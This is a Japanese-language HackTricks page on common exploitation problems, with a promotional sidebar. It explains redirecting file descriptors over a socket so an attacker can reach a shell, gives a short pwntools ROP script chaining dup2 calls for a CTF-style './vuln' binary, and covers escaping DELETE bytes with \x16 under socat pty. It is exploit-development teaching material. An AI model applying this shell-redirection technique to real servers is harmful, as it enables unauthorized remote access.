# 一般的なエクスプロイトの問題

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を使って、ゼロからヒーローまでAWSハッキングを学びましょう</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけます
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れます
* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に**参加**するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングトリックを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>

## リモートエクスプロイテーションにおけるFDs

たとえば、リモートサーバーにエクスプロイトを送信し、**`system('/bin/sh')`**を呼び出すと、これはもちろんサーバープロセスで実行され、`/bin/sh`はstdin（FD：`0`）からの入力を期待し、stdoutとstderr（FD：`1`および`2`）で出力を表示します。そのため、攻撃者はシェルと対話することができません。

これを修正する方法は、サーバーが起動したときに**FD番号`3`**（リスニング用）を作成し、その後、接続が**FD番号`4`**になると仮定することです。したがって、シェルに連絡を取ることが可能になります。

[**ここからのエクスプロイト例**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

socatは既に`stdin`と`stdout`をソケットに転送します。ただし、`pty`モードには**DELETE文字が含まれています**。したがって、`\x7f`（`DELETE` -）を送信すると、エクスプロイトの前の文字が**削除**されます。

これをバイパスするには、**エスケープ文字`\x16`を`\x7f`の前に追加する必要があります**。

**ここでは**[**この動作の例を見つけることができます**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**。**
